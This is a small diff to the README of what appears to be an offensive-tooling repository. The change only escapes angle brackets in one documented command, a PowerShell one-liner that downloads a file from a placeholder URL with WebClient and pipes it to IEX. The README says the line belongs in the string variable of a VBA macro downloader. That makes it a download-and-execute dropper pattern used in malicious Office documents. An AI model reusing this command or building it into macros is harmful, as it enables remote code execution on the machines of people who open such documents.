@@ -8,4 +8,4 @@ In this repository we have some scripts that describes the process to execute a 
 
 The method to use correctly this script is to use it with PSHTTPDownloader.vba, the str var must contian the follwoing line:
 
-powershell (New-Object System.Net.WebClient).DownloadFile('<URL>', '<OUTFILE>') | IEX
+powershell (New-Object System.Net.WebClient).DownloadFile('\<URL\>', '\<OUTFILE\>') | IEX
